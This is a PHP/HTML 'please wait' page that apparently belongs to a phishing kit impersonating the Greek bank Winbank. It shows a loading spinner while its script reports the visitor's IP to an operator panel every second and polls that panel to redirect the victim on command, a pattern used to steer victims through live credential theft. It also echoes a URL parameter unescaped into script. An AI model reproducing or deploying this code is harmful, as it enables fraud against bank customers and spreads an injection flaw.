<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Winbank</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body style="background:#F1F1F0;">
<header>
<div class="container">
<div class="left">
<img src="res/logo.svg">
</div>
<div class="center">
<img src="res/links-lg.png" class="lg">
<img src="res/links-sm.png" class="sm">
</div>
<div class="right">
<img src="res/biglogo.svg">
</div>
</div>
</header>
<main style="background:#F1F1F0;">
<div class="container">




<div class="forma">

<div class="title">Παρακαλούμε περιμένετε...</div>
<div class="text">
Παρακαλούμε περιμένετε μέχρι να επεξεργαστούμε τις πληροφορίες σας. Μην αποχωρήσετε από τη σελίδα. Θα ανακατευθυνθείτε αυτόματα.
</div>



<div class="col">
   <img src="res/loading.gif" style="width:70px;">
</div>


</div>






</div>
</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>